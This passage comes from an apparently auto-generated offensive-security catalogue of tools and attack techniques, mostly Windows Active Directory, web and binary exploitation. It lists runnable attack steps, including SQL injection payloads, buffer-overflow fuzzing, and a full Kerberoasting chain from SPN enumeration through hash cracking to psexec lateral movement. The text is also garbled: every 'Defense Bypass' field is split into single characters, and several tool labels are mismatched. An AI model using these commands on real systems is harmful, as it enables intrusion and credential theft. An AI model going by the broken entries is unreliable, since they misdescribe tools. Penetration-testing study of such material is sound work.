    - When: When checking for AD CS vulnerabilities
    - Output: List of certificate authorities and templates
- Related Techniques: 15 — adcs-esc1, adcs-esc4, adcs-esc8, always-install-elevated, av-evasion, delegation-enum, dll-hijacking, dns-enumeration, gpp-cached-passwords, kerberos-delegation-enum
- Related Tools: 6 — tool:amsi-bypass, tool:invoke-obfuscation, tool:lolbas, tool:runas, tool:solidcore, tool:srum

#### tool:runas — RunAs (NTLM Relay Bypass)
- Zone: defense-evasion | Category: defense-evasion | Type: exe
- OS: windows
- Purpose: Run processes under different user contexts to bypass impersonation restrictions
- Tags: defense-evasion, windows, auth
- Install (kali): # Built into Windows
- Path: Command line
- Commands (1):
  - **Run as different user**: `runas /user:<domain>\<user> /savecred cmd.exe`
    - When: When needing to run under alternate credentials
    - Output: New shell running as specified user
- Related Techniques: 15 — adcs-esc1, always-install-elevated, av-evasion, bootloader-bypass, canary-leak, cmdi-advanced, constrained-delegation-s4u, dll-hijacking, gpp-cached-passwords, persistence
- Related Tools: 6 — tool:amsi-bypass, tool:certify, tool:invoke-obfuscation, tool:lolbas, tool:solidcore, tool:srum

#### tool:lolbas — Living Off The Land Binaries
- Zone: defense-evasion | Category: defense-evasion | Type: reference
- OS: windows
- Purpose: Catalog of legitimate Windows executables that can be abused for defense evasion
- Tags: defense-evasion, lolbins, living-off-the-land
- Install (kali): # Reference: https://lolbas-project.github.io/
- Path: Online
- Commands (1):
  - **GTFOBins/LOLBAS lookup**: `gtfoblookup search`
    - When: When looking for legitimate binary abuse techniques
    - Output: Relevant exploitation techniques for the binary
- Related Techniques: 15 — always-install-elevated, av-evasion, dll-hijacking, gpp-cached-passwords, persistence, registry-autorun, tech:amsi-evasion, tech:kerberoasting, tech:lsass-dump, tech:mimikatz
- Related Tools: 6 — tool:amsi-bypass, tool:certify, tool:invoke-obfuscation, tool:runas, tool:solidcore, tool:srum

#### tool:solidcore — McAfee Solidcore Bypass
- Zone: defense-evasion | Category: defense-evasion | Type: script
- OS: windows
- Purpose: Exploitation techniques against McAfee Solidcore application whitelisting
- Tags: defense-evasion, whitelisting, mcafee
- Install (kali): # Windows technique
- Path: https://github.com/CsEnox/Awesome-McAfee-Solidcore-Bypass
- Commands (1):
  - **Check Solidcore enforcement**: `sc query mcsecflt`
    - When: When encountering application whitelisting
    - Output: Service status of McAfee Solidcore filter driver
- Related Techniques: 15 — av-evasion, buffer-overflow, default-creds-iot, format-string, format-string-exploit, heap-tcache-poison, heap-use-after-free, metasploit-exploitation, persistence-advanced, rop-chain
- Related Tools: 6 — tool:amsi-bypass, tool:certify, tool:invoke-obfuscation, tool:lolbas, tool:runas, tool:srum

#### tool:srum — SRUM Disk Usage
- Zone: defense-evasion | Category: defense-evasion | Type: tool
- OS: windows
- Purpose: Extract network usage data from SRUM to identify forensic artifacts
- Tags: defense-evasion, forensics, windows
- Install (kali): # Available on Windows
- Path: https://github.com/MotorDrift/SrumDumper
- Commands (1):
  - **Parse SRUM data**: `srum_dump.exe /d`
    - When: When investigating forensic artifacts
    - Output: Sample SRUM usage records
- Related Techniques: 15 — always-install-elevated, arp-discovery, av-evasion, dll-hijacking, gpp-cached-passwords, persistence, pivoting, registry-autorun, steganography, tech:kerberoasting
- Related Tools: 6 — tool:amsi-bypass, tool:certify, tool:invoke-obfuscation, tool:lolbas, tool:runas, tool:solidcore


## 4. TECHNIQUES (128 total)

| ID | Name | Zone | OS | Difficulty | Tags | Steps |
|---|---|---|---|---|---|---|
| passive-recon | Passive Reconnaissance | recon | any | 1 | recon, passive, osint, dns | 3 |
| smb-enumeration | SMB Enumeration | active-directory | linux, windows | 2 | active-directory, smb, enumeration, rpc | 3 |
| sql-injection | SQL Injection | web | any | 3 | web, sqli, owasp, database, injection | 3 |
| buffer-overflow | Buffer Overflow | binary-exploitation | linux, windows | 4 | binary, overflow, stack, exploitation, eip | 3 |
| firmware-extraction | Firmware Extraction | iot-firmware | linux | 2 | iot, firmware, extraction, embedded, uart | 3 |
| steganography | Steganography | ctf | any | 2 | ctf, steganography, forensics, images, hidden | 3 |
| kerberoasting | Kerberoasting | active-directory | linux, windows | 3 | active-directory, kerberos, credentials, cracking, spn | 4 |
| asrep-roasting | AS-REP Roasting | active-directory | linux, windows | 2 | active-directory, kerberos, credentials, cracking, asrep | 3 |
| pass-the-hash | Pass-the-Hash | active-directory | linux, windows | 2 | active-directory, ntlm, credentials, pass-the-hash, smb | 4 |
| golden-ticket | Golden Ticket Attack | active-directory | windows | 5 | active-directory, kerberos, persistence, domain-admin, golden-ticket | 3 |
| dcsync | DCSync Attack | active-directory | linux, windows | 3 | active-directory, credentials, dcsync, domain, hashes | 4 |
| xss | Cross-Site Scripting (XSS) | web | any | 2 | web, xss, injection, owasp, client-side | 3 |
| ssrf | Server-Side Request Forgery (SSRF) | web | any | 3 | web, ssrf, injection, internal, cloud | 4 |
| file-inclusion | Local and Remote File Inclusion | web | any | 2 | web, lfi, rfi, injection, rce | 5 |
| format-string | Format String Exploitation | binary-exploitation | linux | 4 | binary, format-string, memory, exploitation, printf | 3 |
| rop-chain | Return-Oriented Programming (ROP) | binary-exploitation | linux, windows | 5 | binary, rop, exploitation, dep, nx | 5 |
| shellcode-development | Shellcode Development | binary-exploitation | linux, windows | 5 | binary, shellcode, exploitation, assembly, payload | 4 |
| iot-uart-debug | UART Debug Access | iot-firmware | linux | 4 | iot, uart, hardware, debug, serial | 6 |
| crypto-analysis | Cryptographic Analysis | ctf | any | 3 | ctf, cryptography, encoding, decryption, analysis | 4 |
| suid-abuse | SUID Binary Privilege Escalation | privilege-escalation | linux | 2 | privilege-escalation, linux, suid, root, binary | 4 |
| sudo-misconfiguration | Sudo Misconfiguration Exploitation | privilege-escalation | linux | 2 | privilege-escalation, linux, sudo, root, misconfiguration | 3 |
| cron-jobs | Cron Job Privilege Escalation | privilege-escalation | linux | 2 | privilege-escalation, linux, cron, root, scheduled-tasks | 4 |
| pivoting | Network Pivoting | lateral-movement | linux | 3 | lateral-movement, pivoting, tunneling, socks, internal | 8 |
| password-spraying | Password Spraying | password-attacks | linux, windows | 2 | password-attacks, brute-force, spraying, smb, credentials | 4 |
| hash-cracking | Hash Cracking | password-attacks | linux, windows | 3 | password-attacks, hashing, cracking, offline | 3 |
| credential-harvesting | Credential Harvesting | post-exploitation | windows, linux | 3 | post-exploitation, credentials, harvesting, memory, browsers | 4 |
| persistence | Persistence Mechanisms | post-exploitation | windows, linux | 3 | post-exploitation, persistence, backdoor, windows, linux | 4 |
| c2-establishment | Command and Control (C2) Establishment | post-exploitation | windows, linux | 4 | post-exploitation, c2, command-control, beacon, management | 4 |
| arp-discovery | ARP Network Discovery | network-enum | linux | 1 | network-enum, arp, discovery, lan, live-hosts | 4 |
| snmp-enumeration | SNMP Enumeration | network-enum | linux | 2 | network-enum, snmp, enumeration, community-string | 4 |
| reporting-screenshots | Screenshot Documentation | reporting | any | 1 | reporting, screenshots, documentation, evidence | 4 |
| metasploit-exploitation | Metasploit Framework Exploitation | exploitation-frameworks | linux, windows | 3 | exploitation, framework, exploits, modules, automation | 4 |
| adcs-esc1 | AD CS ESC1 — Enroll as Any User | active-directory | windows | 3 | ad, adcs, esc1, certificates, authentication-bypass | 4 |
| adcs-esc4 | AD CS ESC4 — Vulnerable Template ACL | active-directory | windows | 3 | ad, adcs, esc4, certificates, acl-abuse | 4 |
| adcs-esc8 | AD CS ESC8 — NTLM Relay to AD CS | active-directory | windows | 3 | ad, adcs, esc8, ntlm-relay, petitpotam | 4 |
| shadow-credentials | Shadow Credentials (msDS-KeyCredentialLink) | active-directory | windows | 3 | ad, shadow-credentials, kerberos, persistence | 4 |
| rbcd-attack | Resource-Based Constrained Delegation (RBCD) | active-directory | windows | 4 | ad, rbcd, delegation, resource-based, s4u | 4 |
| unconstrained-delegation | Unconstrained Delegation Abuse | active-directory | windows | 3 | ad, unconstrained-delegation, kerberos, tgt, printerbug | 5 |
| constrained-delegation-s4u | Constrained Delegation S4U2Self/S4U2Proxy | active-directory | windows | 4 | ad, constrained-delegation, s4u, kerberos, impersonation | 4 |
| silver-ticket | Silver Ticket Attack | active-directory | windows | 4 | ad, silver-ticket, kerberos, forgery, stealth | 4 |
| diamond-ticket | Diamond Ticket Attack | active-directory | windows | 5 | ad, diamond-ticket, kerberos, advanced-persistence | 4 |
| ntlm-relay | NTLM Relay Attack | active-directory | windows, linux | 3 | ad, ntlm-relay, smb, authentication | 4 |
| llmnr-poisoning | LLMNR/NBT-NS Poisoning | active-directory | windows, linux | 2 | ad, llmnr, nbns, poisoning, ntlm, hash-capture | 4 |
| ipv6-mitm | IPv6 MITM with mitm6 | active-directory | linux, windows | 3 | ad, ipv6, mitm, dns, ntlm-relay | 4 |
| acl-abuse-genericall | ACL Abuse — GenericAll | active-directory | windows | 3 | ad, acl, genericall, privilege-escalation | 4 |
| acl-abuse-writedacl | ACL Abuse — WriteDACL | active-directory | windows | 3 | ad, acl, writedacl, dacl, privilege-escalation | 3 |
| acl-abuse-forcechangepassword | ACL Abuse — ForceChangePassword | active-directory | windows | 2 | ad, acl, forcechangepassword, password-reset | 3 |
| acl-abuse-addmember | ACL Abuse — AddMember | active-directory | windows | 2 | ad, acl, addmember, group-membership, privilege-escalation | 3 |
| acl-abuse-genericwrite | ACL Abuse — GenericWrite | active-directory | windows | 3 | ad, acl, genericwrite, kerberoasting, persistence | 3 |
| gpo-abuse | GPO Abuse | active-directory | windows | 4 | ad, gpo, group-policy, persistence, domain-wide | 4 |
| pass-the-ticket | Pass-the-Ticket (PTT) | active-directory | windows | 2 | ad, kerberos, pass-the-ticket, lateral-movement | 4 |
| overpass-the-hash | Overpass-the-Hash | active-directory | windows, linux | 3 | ad, kerberos, overpass-the-hash, ntlm, lateral-movement | 4 |
| kerberos-delegation-enum | Delegation Enumeration | active-directory | windows, linux | 2 | ad, delegation, enumeration, unconstrained, constrained, rbcd | 4 |
| pre2k-attack | Pre-2000 Computer Account Attack | active-directory | windows | 3 | ad, pre2k, computer-accounts, legacy, password-prediction | 4 |
| trust-abuse | Domain Trust Abuse | active-directory | windows | 4 | ad, trust, cross-domain, forest, sid-history | 4 |
| always-install-elevated | Always Install Elevated | privilege-escalation | windows | 2 | privesc, windows, msi, always-install-elevated, registry | 4 |
| unquoted-service-paths | Unquoted Service Paths | privilege-escalation | windows | 2 | privesc, windows, unquoted-paths, services | 4 |
| dll-hijacking | DLL Hijacking | privilege-escalation | windows | 3 | privesc, windows, dll-hijacking, services | 4 |
| token-impersonation | Token Impersonation (Potato Family) | privilege-escalation | windows | 3 | privesc, windows, potato, token-impersonation, seimpersonate | 4 |
| uac-bypass | UAC Bypass | privilege-escalation | windows | 2 | privesc, windows, uac-bypass, admin | 4 |
| registry-autorun | Registry AutoRun Persistence | privilege-escalation | windows | 2 | privesc, windows, registry, persistence, autorun | 4 |
| weak-service-permissions | Weak Service Permissions | privilege-escalation | windows | 2 | privesc, windows, services, permissions, accesschk | 3 |
| gpp-cached-passwords | GPP Cached Passwords | privilege-escalation | windows | 2 | privesc, windows, gpp, cpassword, sysvol | 3 |
| lfi-advanced | Advanced LFI & Log Poisoning | web | linux, windows | 3 | web, lfi, log-poisoning, rce, file-inclusion | 6 |
| cmdi-advanced | Advanced OS Command Injection | web | linux, windows | 2 | web, command-injection, rce, cmdi, bypass | 5 |
| wordpress-exploitation | WordPress Exploitation | web | linux | 2 | web, wordpress, cms, wpscan, rce, bruteforce | 5 |
| burp-workflow | Burp Suite Workflow | web | any | 2 | web, burp, proxy, testing, workflow | 5 |
| heap-tcache-poison | Tcache Poisoning | binary-exploitation | linux | 4 | binary, heap, tcache, glibc, exploitation | 4 |
| heap-fastbin-dup | Fastbin Double Free | binary-exploitation | linux | 4 | binary, heap, fastbin, double-free, glibc | 4 |
| heap-unsorted-bin-attack | Unsorted Bin Attack | binary-exploitation | linux | 4 | binary, heap, unsorted-bin, arbitrary-write, glibc | 4 |
| heap-house-of-force | House of Force | binary-exploitation | linux | 4 | binary, heap, house-of-force, top-chunk, arbitrary-write | 4 |
| heap-use-after-free | Use-After-Free (UAF) | binary-exploitation | linux | 4 | binary, heap, uaf, use-after-free, exploitation | 4 |
| heap-double-free | Double Free | binary-exploitation | linux | 4 | binary, heap, double-free, freelist, corruption | 4 |
| format-string-exploit | Format String Exploitation | binary-exploitation | linux, windows | 3 | binary, format-string, memory-disclosure, arbitrary-write | 4 |
| srop | SROP — Sigreturn Oriented Programming | binary-exploitation | linux | 4 | binary, srop, sigreturn, rop, advanced | 4 |
| ret2csu | ret2csu — __libc_csu_init Gadgets | binary-exploitation | linux | 4 | binary, rop, ret2csu, x86-64, gadgets | 4 |
| got-overwrite | GOT Overwrite | binary-exploitation | linux | 3 | binary, got, plt, overwrite, format-string | 4 |
| canary-leak | Stack Canary Leak | binary-exploitation | linux | 3 | binary, canary, stack-protector, bypass, leak | 4 |
| pie-bypass | PIE Bypass via Address Leak | binary-exploitation | linux | 3 | binary, pie, aslr, bypass, leak | 4 |
| integer-overflow | Integer Overflow to Buffer Overflow | binary-exploitation | linux, windows | 4 | binary, integer-overflow, logic-bug, buffer-overflow | 4 |
| blind-rop | Blind ROP | binary-exploitation | linux | 5 | binary, blind-rop, remote, no-binary | 4 |
| uart-access | UART Console Access | iot-firmware | linux | 4 | iot, uart, hardware, serial, console | 6 |
| jtag-debugging | JTAG Debugging | iot-firmware | linux | 5 | iot, jtag, hardware, debugging, firmware-extraction | 5 |
| spi-flash-dump | SPI Flash Extraction | iot-firmware | linux | 4 | iot, spi, flash, hardware, chip-off | 4 |
| firmware-emulation | Firmware Emulation | iot-firmware | linux | 3 | iot, emulation, qemu, dynamic-analysis, firmware | 4 |
| nvram-analysis | NVRAM Configuration Analysis | iot-firmware | linux | 3 | iot, nvram, credentials, configuration | 4 |
| mqtt-attack | MQTT Protocol Attack | iot-firmware | linux | 2 | iot, mqtt, protocol, broker, message-injection | 4 |
| firmware-cgi-injection | CGI Command Injection in Firmware | iot-firmware | linux | 2 | iot, cgi, command-injection, firmware, rce | 4 |
| default-creds-iot | Default Credential Exploitation | iot-firmware | any | 1 | iot, default-creds, authentication, firmware | 4 |
| bootloader-bypass | Bootloader Bypass | iot-firmware | linux | 4 | iot, bootloader, u-boot, hardware, root-shell | 4 |
| double-pivot | Double/Triple Pivot | lateral-movement | linux, windows | 4 | pivoting, multi-pivot, chisel, ligolo, chain | 4 |
| dns-enumeration | DNS Enumeration | recon | any | 2 | recon, dns, enumeration, subdomains | 4 |
| hashcat-attacks | Hash Cracking with Hashcat | password-attacks | linux, windows | 2 | password, hashcat, cracking, offline | 4 |
| credential-harvesting-advanced | Advanced Credential Harvesting | post-exploitation | windows, linux | 3 | post-exploitation, credentials, mimikatz, lsass, harvesting | 4 |
| persistence-advanced | Advanced Persistence Techniques | post-exploitation | windows, linux | 4 | post-exploitation, persistence, golden-ticket, silver-ticket, kerberos | 4 |
| av-evasion | Antivirus Evasion | defense-evasion | windows, linux | 3 | defense-evasion, av, edr, obfuscation, shellter | 4 |
| delegation-enum | Delegation Enumeration | active-directory | linux, windows | 3 | kerberos, ad, enumeration | 3 |
| gpp-abuse | GPP Password Abuse | active-directory | linux | 2 | gpp, ad, credentials | 3 |
| skeleton-key | Skeleton Key malware | active-directory | windows, linux | 5 | mimikatz, ad, persistence | 3 |
| tech:sqli-auth-bypass | SQL Injection - Authentication Bypass | web | linux, macos, windows |  | sqli, auth-bypass, web | 5 |
| tech:xss-reflected | Reflected XSS | web | linux, macos, windows |  | xss, injection, web | 5 |
| tech:csrf | Cross-Site Request Forgery | web | linux, macos, windows |  | csrf, web, auth | 5 |
| tech:ssrf | Server-Side Request Forgery | web | linux, macos, windows |  | ssrf, internal, cloud | 5 |
| tech:idor | Insecure Direct Object Reference | web | linux, macos, windows |  | idor, access-control, web | 5 |
| tech:broken-access-control | Broken Access Control (OWASP) | web | linux, macos, windows |  | access-control, web, auth | 5 |
| tech:password-spraying | Password Spraying | recon | linux, macos, windows |  | password, bruteforce, spraying | 5 |
| tech:kerberoasting | Kerberoasting | recon | linux |  | kerberoasting, kerberos, windows | 5 |
| tech:ntlm-cracking | NTLM Hash Cracking | recon | linux, macos |  | hash, ntlm, cracking | 5 |
| tech:llmnr-nbtspoofing | LLMNR/NBT-NS Poisoning | recon | linux |  | llmnr, nbt-ns, relaying | 5 |
| tech:ps-remoting | PowerShell Remoting (WinRM) | recon | windows, linux |  | ps-remoting, winrm, windows | 5 |
| tech:ssh-lateral | SSH Lateral Movement | recon | linux, macos |  | ssh, lateral, linux | 5 |
| tech:pass-the-hash | Pass-the-Hash | recon | linux, windows |  | pth, hash, windows | 5 |
| tech:psexec | PsExec Lateral Movement | recon | linux, windows |  | psexec, smb, windows | 5 |
| tech:wmi-lateral | WMI Lateral Movement | recon | windows |  | wmi, windows, lateral | 5 |
| tech:sudo-lpe | Sudo/SUID Privilege Escalation | privilege-escalation | linux |  | sudo, suid, linux, priv-esc | 5 |
| tech:kernel-exploit | Kernel Exploit for Privilege Escalation | privilege-escalation | linux |  | kernel, linux, priv-esc | 5 |
| tech:linux-docker-escape | Docker Escape Privilege Escalation | privilege-escalation | linux |  | docker, container, linux | 5 |
| tech:unquoted-service | Unquoted Service Path | privilege-escalation | windows |  | windows, service, priv-esc | 5 |
| tech:jenkins-script | Jenkins Script Console Exploitation | exploitation-frameworks | linux |  | jenkins, groovy, rce | 5 |
| tech:mimikatz | Credential Dumping (Mimikatz) | privilege-escalation | windows |  | mimikatz, credentials, windows | 5 |
| tech:powerview | Domain Reconnaissance (PowerSploit) | recon | windows |  | ad, recon, windows | 5 |
| tech:lsass-dump | LSASS Memory Dump | privilege-escalation | windows |  | lsass, dump, windows | 5 |
| tech:persistence-registry | Registry Persistence | exploitation-frameworks | windows |  | persistence, registry, windows | 5 |
| tech:persistence-cron | Cron-based Persistence | exploitation-frameworks | linux |  | persistence, cron, linux | 5 |
| tech:socks-proxy | SOCKS Proxy via SSH | recon | linux, macos |  | socks, proxy, tunnel | 5 |
| tech:port-forwarding | Port Forwarding and Pivoting | network-enum | linux, macos |  | pivot, tunnel, port-forwarding | 5 |
| tech:sshuttle | SSHuttle VPN over SSH | recon | linux, macos |  | sshuttle, vpn, proxy | 5 |
| tech:cloud-metadata | Cloud Metadata Service Exploitation | exploitation-frameworks | linux |  | metadata, cloud, aws, iam | 5 |

### Technique Details

#### passive-recon — Passive Reconnaissance
- Zone: recon | Category: recon | Difficulty: 1
- OS: any
- Tags: recon, passive, osint, dns
- Purpose: Gather information about a target without direct interaction, using public sources like WHOIS, DNS records, and search engines.
- When To Use: At the very beginning of an engagement to build target profile without alerting defenses.
- Prerequisites: Target domain or IP address
- Defense Bypass: P, a, s, s, i, v, e,  , r, e, c, o, n,  , g, e, n, e, r, a, t, e, s,  , m, i, n, i, m, a, l,  , l, o, g, s, .,  , S, o, m, e,  , o, r, g, a, n, i, z, a, t, i, o, n, s,  , m, o, n, i, t, o, r,  , W, H, O, I, S,  , q, u, e, r, i, e, s, .
- Remediation: Implement network segmentation and disable unnecessary services
- MITRE ID: T1595
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Perform WHOIS lookup to get registration details', 'command': 'whois target.com', 'note': 'Look for admin contacts, name servers, and registration dates'}
  2. {'step': 2, 'description': 'Enumerate subdomains using passive DNS', 'command': 'subfinder -d target.com -silent', 'note': 'Subfinder queries multiple passive DNS sources'}
  3. {'step': 3, 'description': 'Gather historical data', 'command': 'waybackurls target.com | sort -u', 'note': 'Wayback Machine may reveal old endpoints still in use'}
- Related Tools: 15 — adidnsdump, amass, arp-scan, curl, dig, docker, feroxbuster, foca, git, gobuster, grep, httpx, ivre, masscan, metagoofil

#### smb-enumeration — SMB Enumeration
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: linux, windows
- Tags: active-directory, smb, enumeration, rpc
- Purpose: Enumerate SMB shares, users, and groups on Windows and Samba systems to identify misconfigurations and sensitive data.
- When To Use: When you have identified a Windows/Samba host on the network.
- Prerequisites: Target IP with SMB port (139/445) accessible
- Defense Bypass: S, M, B,  , e, n, u, m, e, r, a, t, i, o, n,  , l, o, g, s,  , a, p, p, e, a, r,  , i, n,  , W, i, n, d, o, w, s,  , E, v, e, n, t,  , L, o, g, s,  , (, E, v, e, n, t,  , I, D,  , 5, 1, 5, 6, ,,  , 4, 6, 7, 2, ), .,  , U, s, e,  , n, u, l, l,  , s, e, s, s, i, o, n, s,  , c, a, r, e, f, u, l, l, y, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1046
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Check for anonymous/null session access', 'command': 'smbclient -L //TARGET_IP -N', 'note': 'If shares are listed, you have anonymous access'}
  2. {'step': 2, 'description': 'Enumerate users via RPC', 'command': "rpcclient -U '' TARGET_IP -c 'enumdomusers'", 'note': 'Lists all domain users even without credentials'}
  3. {'step': 3, 'description': 'Check for writable shares', 'command': "smbmap -u '' -p '' -H TARGET_IP", 'note': 'Identify shares where you can upload files'}
- Related Tools: 15 — adidnsdump, beroot, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, godpotato, gpp-decrypt, impacket, impacket-secretsdump, juicy-potato

#### sql-injection — SQL Injection
- Zone: web | Category: web | Difficulty: 3
- OS: any
- Tags: web, sqli, owasp, database, injection
- Purpose: Exploit SQL injection vulnerabilities to extract, modify, or delete database data through unsanitized user input.
- When To Use: When any user input is reflected in database queries. Always test for time-based blind if error-based fails.
- Prerequisites: Target URL with parameters, Burp Suite or browser for testing
- Defense Bypass: W, A, F, s,  , m, a, y,  , b, l, o, c, k,  , S, Q, L,  , k, e, y, w, o, r, d, s, .,  , U, s, e,  , e, n, c, o, d, i, n, g, ,,  , c, o, m, m, e, n, t, s, ,,  , a, n, d,  , t, i, m, e, -, b, a, s, e, d,  , b, l, i, n, d,  , i, n, j, e, c, t, i, o, n,  , t, o,  , b, y, p, a, s, s, .
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1190
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify injectable parameters', 'command': "' OR 1=1 --", 'note': 'Test GET/POST parameters, headers, and cookies'}
  2. {'step': 2, 'description': 'Determine database type and version', 'command': "' UNION SELECT @@version --", 'note': 'MySQL, MSSQL, PostgreSQL, Oracle all have different version queries'}
  3. {'step': 3, 'description': 'Enumerate database structure', 'command': "' UNION SELECT table_name FROM information_schema.tables --", 'note': 'List all tables, then columns, then data'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, libc-database

#### buffer-overflow — Buffer Overflow
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux, windows
- Tags: binary, overflow, stack, exploitation, eip
- Purpose: Overwrite stack memory by sending oversized input to gain code execution through return address manipulation.
- When To Use: When a binary accepts user input and crashes with SIGSEGV, or when stack protections are disabled.
- Prerequisites: Target binary compiled without stack canary or with NX disabled, GDB with pwndbg, Python for exploit scripts
- Defense Bypass: S, t, a, c, k,  , c, a, n, a, r, i, e, s,  , p, r, e, v, e, n, t,  , s, i, m, p, l, e,  , o, v, e, r, f, l, o, w, s, .,  , A, S, L, R,  , r, a, n, d, o, m, i, z, e, s,  , a, d, d, r, e, s, s, e, s, .,  , D, E, P, /, N, X,  , p, r, e, v, e, n, t, s,  , c, o, d, e,  , e, x, e, c, u, t, i, o, n,  , o, n,  , s, t, a, c, k, .
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1190
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Fuzz the binary to find crash offset', 'command': 'python3 -c \'print("A"*100)\' | ./vuln', 'note': 'Increase until EIP is overwritten'}
  2. {'step': 2, 'description': 'Generate pattern and find offset', 'command': 'pattern_create -l 200\npattern_offset -q 0x39684138', 'note': 'Use Metasploit pattern tools or pwntools'}
  3. {'step': 3, 'description': 'Control EIP and find JMP ESP', 'command': 'python3 -c \'print("A"*OFFSET + "B"*4 + "C"*100)\'', 'note': 'Look for JMP ESP or similar gadgets'}
- Related Tools: 15 — ROPgadget, angr, checksec, commix, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### firmware-extraction — Firmware Extraction
- Zone: iot-firmware | Category: iot-firmware | Difficulty: 2
- OS: linux
- Tags: iot, firmware, extraction, embedded, uart
- Purpose: Extract firmware from IoT devices using various methods including UART, JTAG, and direct firmware file analysis.
- When To Use: When analyzing an IoT device for vulnerabilities or when you have a firmware image file.
- Prerequisites: Firmware image file or physical access to device, Serial adapter (UART) or JTAG debugger if needed
- Defense Bypass: F, i, r, m, w, a, r, e,  , e, x, t, r, a, c, t, i, o, n,  , i, s,  , t, y, p, i, c, a, l, l, y,  , o, f, f, l, i, n, e, .,  , N, o,  , a, l, e, r, t, s,  , g, e, n, e, r, a, t, e, d,  , u, n, l, e, s, s,  , d, e, v, i, c, e,  , l, o, g, s,  , p, h, y, s, i, c, a, l,  , a, c, c, e, s, s, .
- Remediation: Secure boot, encrypted firmware updates, disable debug interfaces
- MITRE ID: T1190
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify firmware format', 'command': 'file firmware.bin', 'note': "Check if it's raw binary, SquashFS, JFFS2, or custom format"}
  2. {'step': 2, 'description': 'Extract using binwalk', 'command': 'binwalk -eM firmware.bin', 'note': 'Automatically detects and extracts filesystems'}
  3. {'step': 3, 'description': 'Analyze extracted filesystem', 'command': 'ls -la _firmware.bin.extracted/', 'note': 'Look for /etc/passwd, /etc/shadow, web interfaces, scripts'}
- Related Tools: 15 — angr, arduino-cli, binwalk, boofuzz, checksec, exiftool, file, firmware-mod-kit, flashrom, gdb, ghidra, jtagulator, minicom, mosquitto-clients, mqtt-explorer

#### steganography — Steganography
- Zone: ctf | Category: ctf | Difficulty: 2
- OS: any
- Tags: ctf, steganography, forensics, images, hidden
- Purpose: Hide and extract data within non-secret files like images, audio, and documents.
- When To Use: When a CTF challenge mentions hidden data, or when you see unusual file sizes or metadata.
- Prerequisites: Suspicious image or file, Steganography tools
- Defense Bypass: S, t, e, g, a, n, o, g, r, a, p, h, y,  , i, s,  , u, n, d, e, t, e, c, t, a, b, l, e,  , w, i, t, h, o, u, t,  , p, r, i, o, r,  , k, n, o, w, l, e, d, g, e, .,  , S, t, a, t, i, s, t, i, c, a, l,  , a, n, a, l, y, s, i, s,  , t, o, o, l, s,  , c, a, n,  , s, o, m, e, t, i, m, e, s,  , d, e, t, e, c, t,  , i, t, .
- Remediation: General security best practices and input validation
- MITRE ID: T1027
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Check file type and metadata', 'command': 'file image.png && exiftool image.png', 'note': 'Might reveal hidden data in metadata'}
  2. {'step': 2, 'description': 'Extract hidden data with steghide', 'command': 'steghide extract -sf image.jpg -p password', 'note': 'Requires passphrase or brute force with stegcracker'}
  3. {'step': 3, 'description': 'Analyze with binwalk', 'command': 'binwalk -e image.png', 'note': 'May reveal appended data after EOF marker'}
- Related Tools: 15 — binwalk, cyberchef, exiftool, foca, gobuster, metagoofil, pwninit, pwntools, stegcracker, steghide, stegsolve, tool:autopsy, tool:cyberchef, tool:exiftool, tool:hash-identifier

#### kerberoasting — Kerberoasting
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: linux, windows
- Tags: active-directory, kerberos, credentials, cracking, spn
- Purpose: Extract service account credentials by requesting TGS tickets and cracking them offline.
- When To Use: When you have a valid domain user account and the domain has service accounts with weak passwords.
- Prerequisites: Valid domain user credentials, Service accounts registered in SPNs
- Defense Bypass: K, e, r, b, e, r, o, a, s, t, i, n, g,  , g, e, n, e, r, a, t, e, s,  , E, v, e, n, t,  , I, D,  , 4, 7, 6, 8,  , (, K, e, r, b, e, r, o, s,  , s, e, r, v, i, c, e,  , t, i, c, k, e, t,  , r, e, q, u, e, s, t, s, ), .,  , D, e, t, e, c, t, i, o, n,  , r, e, q, u, i, r, e, s,  , m, o, n, i, t, o, r, i, n, g,  , f, o, r,  , u, n, u, s, u, a, l,  , T, G, S,  , r, e, q, u, e, s, t, s, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558.003
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate Kerberoastable accounts (users with SPNs)', 'command': 'ldapsearch -x -H ld://DC_IP -D "user@domain" -w pass -b "dc=domain,dc=com" "(servicePrincipalName=*)"', 'note': 'Or use GetUserSPNs.py / PowerView Get-DomainUser -SPN'}
  2. {'step': 2, 'description': 'Request TGS tickets for each SPN account', 'command': 'impacket-GetUserSPNs domain/user:pass -dc-ip DC_IP -request', 'note': 'Tickets are cached in memory; this extracts them without needing the account password'}
  3. {'step': 3, 'description': 'Crack TGS hashes offline', 'command': 'hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt', 'note': 'SPN accounts often have weak passwords; cracking yields plaintext credentials'}
  4. {'step': 4, 'description': 'Use cracked credentials for lateral movement or privilege escalation', 'command': 'impacket-psexec domain/spn_user:cracked_pass@TARGET', 'note': 'If SPN account is privileged, this grants access to all its resources'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, hashcat, impacket, impacket-secretsdump, john, kerbrute

#### asrep-roasting — AS-REP Roasting
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: linux, windows
- Tags: active-directory, kerberos, credentials, cracking, asrep
- Purpose: Exploit users with 'Do not require Kerberos pre-authentication' to obtain crackable hashes.
